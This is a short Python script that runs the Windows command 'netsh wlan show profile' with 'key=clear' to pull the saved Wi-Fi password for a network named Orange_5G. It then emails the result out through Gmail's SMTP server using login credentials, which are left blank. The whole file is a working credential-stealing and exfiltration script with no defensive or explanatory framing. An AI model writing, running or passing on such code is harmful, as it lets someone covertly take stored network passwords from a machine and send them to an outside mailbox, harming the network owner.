import subprocess, smtplib

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

commands = "netsh wlan show profile Orange_5G key=clear"
result = subprocess.check_output(commands, shell=True)
send_mail("", "", message=result)